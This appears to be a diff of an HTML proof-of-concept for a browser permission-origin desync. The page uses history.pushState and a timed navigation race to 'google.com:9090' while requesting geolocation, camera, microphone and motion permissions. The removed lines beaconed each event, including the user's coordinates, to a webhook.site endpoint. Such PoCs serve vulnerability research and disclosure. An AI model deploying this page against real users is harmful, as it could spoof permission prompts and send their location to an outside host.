@@ -2,621 +2,264 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Permission Origin Desync PoC</title>
+<title>Permission Origin Test</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-body {
-  margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,system-ui;
-  background:#f5f5f7;
-}
-
-button {
-  font-size:15px;
-  padding:10px 14px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:white;
-  margin:5px;
-}
-
-#panel {
-  display:none;
-  max-width:420px;
-  margin:80px auto;
-  background:white;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.2);
-  text-align:center;
-}
-
-.notice {
-  margin-top:14px;
-  font-size:13px;
-  color:#b00020;
-}
-
-pre {
-  text-align:left;
-  font-size:12px;
-  background:#eee;
-  padding:10px;
-  border-radius:8px;
-}
-</style>
-
 </head>
 
 <body>
 
-
-<div style="text-align:center;margin-top:60px;">
-<button id="trigger">
+<button id="start">
 Start PoC
 </button>
-</div>
 
+<hr>
 
+<button onclick="geo()">Geolocation</button>
+<button onclick="camera()">Camera</button>
+<button onclick="mic()">Microphone</button>
+<button onclick="motion()">Motion</button>
+<button onclick="orientation()">Orientation</button>
 
-<div id="panel">
-
-<h2>Permission Test</h2>
-
-<p>
-Current URL:
-<br>
-<span id="url"></span>
-</p>
-
-
-<button onclick="getLocation()">
-Geolocation
-</button>
-
-
-<button onclick="getCameraMic()">
-Camera + Mic
-</button>
-
-
-<button onclick="getMotion()">
-Motion
-</button>
-
-
-<button onclick="getOrientation()">
-Orientation
-</button>
-
-
-
-<p id="output">
-Result: -
-</p>
-
-
-<pre id="logbox"></pre>
-
-
-<div class="notice">
-Demo only. Observe permission origin shown by browser.
-</div>
-
-
-</div>
-
+<p id="url"></p>
+<p id="result">Result:</p>
 
 
 <script>
 
-
-const LOG_ENDPOINT =
-"https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+const result = document.getElementById("result");
 
 
+function show(x){
+    result.innerHTML = x;
+}
 
-function logEvent(type, extra={}) {
 
+/*
+ STEP 1
+ same origin state change
+*/
 
-const data = {
+document.getElementById("start").onclick = ()=>{
 
-type,
+    history.pushState(
+        {},
+        "",
+        "/trusted"
+    );
 
-ts:performance.now().toFixed(3),
-
-epoch:Date.now(),
-
-url:location.href,
-
-origin:location.origin,
-
-visibility:document.visibilityState,
-
-readyState:document.readyState,
-
-...extra
+    document.getElementById("url").innerHTML =
+        location.href;
 
 };
 
 
 
-const params =
-new URLSearchParams(data).toString();
+/*
+ GEOLOCATION
+*/
 
+function geo(){
 
+    navigator.geolocation.getCurrentPosition(
 
-new Image().src =
-`${LOG_ENDPOINT}?${params}`;
+        pos=>{
 
+            show(
+                "Geo OK<br>" +
+                pos.coords.latitude +
+                "<br>" +
+                pos.coords.longitude
+            );
 
+        },
 
-const box =
-document.getElementById("logbox");
+        err=>{
 
+            show(
+                "Geo error: " +
+                err.message
+            );
 
-if(box){
+        }
 
-box.textContent +=
-JSON.stringify(data,null,2)
-+
-"\n\n";
+    );
 
 }
-
-}
-
-
-
-
-const panel =
-document.getElementById("panel");
-
-
-const trigger =
-document.getElementById("trigger");
-
-
-const output =
-document.getElementById("output");
-
 
 
 
 /*
-==========================
-GEOLOCATION
-==========================
+ CAMERA
 */
 
+async function camera(){
 
-function getLocation(){
+    try{
 
-
-if(!navigator.geolocation){
-
-output.textContent =
-"Geolocation unavailable";
-
-return;
-
-}
+        let stream =
+        await navigator.mediaDevices.getUserMedia({
+            video:true
+        });
 
 
-
-logEvent(
-"geolocation_requested"
-);
+        show("Camera OK");
 
 
-
-navigator.geolocation.getCurrentPosition(
-
-
-pos=>{
+        stream.getTracks()
+        .forEach(t=>t.stop());
 
 
-logEvent(
-"geolocation_success",
-{
+    }catch(e){
 
-lat:pos.coords.latitude,
+        show(
+            "Camera error: " + e.message
+        );
 
-lon:pos.coords.longitude
+    }
 
 }
-
-);
-
-
-
-output.textContent =
-`${pos.coords.latitude}, ${pos.coords.longitude}`;
-
-
-},
-
-
-
-err=>{
-
-
-logEvent(
-"geolocation_error",
-{
-code:err.code,
-message:err.message
-}
-
-);
-
-
-output.textContent =
-"Geolocation denied";
-
-
-}
-
-
-);
-
-
-}
-
 
 
 
 /*
-==========================
-CAMERA + MICROPHONE
-==========================
+ MICROPHONE
 */
 
+async function mic(){
 
-async function getCameraMic(){
+    try{
 
-
-logEvent(
-"camera_mic_requested"
-);
-
-
-
-try{
+        let stream =
+        await navigator.mediaDevices.getUserMedia({
+            audio:true
+        });
 
 
-const stream =
-await navigator.mediaDevices.getUserMedia({
-
-video:true,
-
-audio:true
-
-});
+        show("Mic OK");
 
 
-
-logEvent(
-"camera_mic_success"
-);
+        stream.getTracks()
+        .forEach(t=>t.stop());
 
 
+    }catch(e){
 
-output.textContent =
-"Camera + Mic granted";
+        show(
+            "Mic error: " + e.message
+        );
 
-
-
-stream.getTracks()
-.forEach(track=>track.stop());
-
-
+    }
 
 }
-
-catch(e){
-
-
-logEvent(
-"camera_mic_error",
-{
-message:e.message
-}
-
-);
-
-
-output.textContent =
-"Camera/Mic denied";
-
-
-}
-
-
-}
-
 
 
 
 /*
-==========================
-MOTION
-==========================
+ MOTION
 */
 
+async function motion(){
 
-async function getMotion(){
+    try{
 
+        if(DeviceMotionEvent.requestPermission){
 
-logEvent(
-"motion_requested"
-);
+            let r =
+            await DeviceMotionEvent.requestPermission();
 
+            show(
+                "Motion: " + r
+            );
 
+        }else{
 
-try{
+            show(
+                "Motion unavailable"
+            );
 
-
-if(
-typeof DeviceMotionEvent !== "undefined" &&
-DeviceMotionEvent.requestPermission
-){
-
-
-const result =
-await DeviceMotionEvent.requestPermission();
-
+        }
 
 
-logEvent(
-"motion_result",
-{
-result
-}
-);
+    }catch(e){
 
+        show(
+            "Motion error: " + e.message
+        );
 
-
-output.textContent =
-"Motion: "+result;
-
+    }
 
 }
-
-else{
-
-
-logEvent(
-"motion_not_supported"
-);
-
-
-output.textContent =
-"Motion unsupported";
-
-
-}
-
-
-}
-
-catch(e){
-
-
-logEvent(
-"motion_error",
-{
-message:e.message
-}
-
-);
-
-
-}
-
-
-}
-
 
 
 
 /*
-==========================
-ORIENTATION
-==========================
+ ORIENTATION
 */
 
+async function orientation(){
 
-async function getOrientation(){
+    try{
 
+        if(DeviceOrientationEvent.requestPermission){
 
-logEvent(
-"orientation_requested"
-);
+            let r =
+            await DeviceOrientationEvent.requestPermission();
 
+            show(
+                "Orientation: " + r
+            );
 
+        }else{
 
-try{
+            show(
+                "Orientation unavailable"
+            );
 
-
-if(
-typeof DeviceOrientationEvent !== "undefined" &&
-DeviceOrientationEvent.requestPermission
-){
-
-
-const result =
-await DeviceOrientationEvent.requestPermission();
-
+        }
 
 
-logEvent(
-"orientation_result",
-{
-result
-}
-);
+    }catch(e){
 
+        show(
+            "Orientation error: " + e.message
+        );
 
-
-output.textContent =
-"Orientation: "+result;
-
-
+    }
 
 }
-
-else{
-
-
-logEvent(
-"orientation_not_supported"
-);
-
-
-output.textContent =
-"Orientation unsupported";
-
-
-}
-
-
-}
-
-catch(e){
-
-
-logEvent(
-"orientation_error",
-{
-message:e.message
-}
-
-);
-
-
-}
-
-
-}
-
-
 
 
 
 /*
-==========================
-STEP 1
-KEEP ORIGINAL LOGIC
-==========================
+ OPTIONAL RACE TEST
 */
-
-
-trigger.onclick = ()=>{
-
-
-logEvent(
-"poc_started"
-);
-
-
-
-history.pushState(
-{},
-"",
-"/trusted"
-);
-
-
-
-logEvent(
-"pushstate_done",
-{
-newPath:location.pathname
-}
-
-);
-
-
-
-document.getElementById("url")
-.textContent =
-location.href;
-
-
-
-panel.style.display =
-"block";
-
-
-};
-
-
-
-
-
-/*
-==========================
-STEP 2
-NAVIGATION RACE
-KEEP ORIGINAL LOGIC
-==========================
-*/
-
 
 window.addEventListener(
 "pageshow",
 ()=>{
 
+    requestAnimationFrame(()=>{
 
-logEvent(
-"pageshow"
-);
+        requestAnimationFrame(()=>{
 
+            setTimeout(()=>{
 
+                // aktifkan jika ingin test race
 
-requestAnimationFrame(()=>{
-
-
-requestAnimationFrame(()=>{
-
-
-setTimeout(()=>{
+                  location.href =
+                 "https://google.com:9090";
 
 
-logEvent(
-"navigation_triggered",
-{
-target:"https://google.com:9090"
-}
+            },80);
 
-);
+        });
 
-
-
-location.href =
-"https://google.com:9090";
-
-
-
-},80);
-
-
+    });
 
 });
-
-
-});
-
-
-});
-
 
 
 </script>
-
 
 </body>
 </html>
